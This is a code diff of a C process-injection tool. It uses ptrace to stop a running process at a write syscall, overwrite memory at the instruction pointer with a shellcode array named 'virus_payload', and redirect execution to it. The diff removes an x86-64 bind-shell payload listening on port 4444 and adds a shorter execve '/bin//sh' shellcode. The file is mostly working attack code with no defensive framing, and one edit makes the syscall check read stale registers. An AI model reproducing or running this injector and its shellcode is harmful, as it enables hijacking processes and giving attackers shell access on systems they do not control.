@@ -16,11 +16,9 @@
 #include <sys/syscall.h>
 
 char virus_payload[] =
-    "\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"
-"\x11\x5c"
-"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05";
- 
- 
+    "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
+    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
+
 int inject_code(pid_t pid, long address, int size, void *payload);
 
 int main(int argc, char *argv[])
@@ -47,13 +45,15 @@ int main(int argc, char *argv[])
 		{
             ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
             wait(&status);
-            ptrace(PTRACE_GETREGS, pid, NULL, &registers);
             if(registers.orig_rax == SYS_write)
             {
-                long addr = registers.rip;//rsp-1024;
+               ptrace(PTRACE_GETREGS, pid, NULL, &registers);
+
+                long addr = registers.rip;
+                printf("[+] Addr = 0x%0.16x\n", addr);
                 inject_code(pid, addr, strlen(virus_payload), (void *)virus_payload);
 
-                registers.rip = addr;//+2;
+                registers.rip = addr;
                 printf("[+] RIP now points to 0x%0.16x\n", registers.rip);
                 ptrace(PTRACE_SETREGS, pid, 0, &registers);
                 ptrace(PTRACE_DETACH, pid, 0, 0);
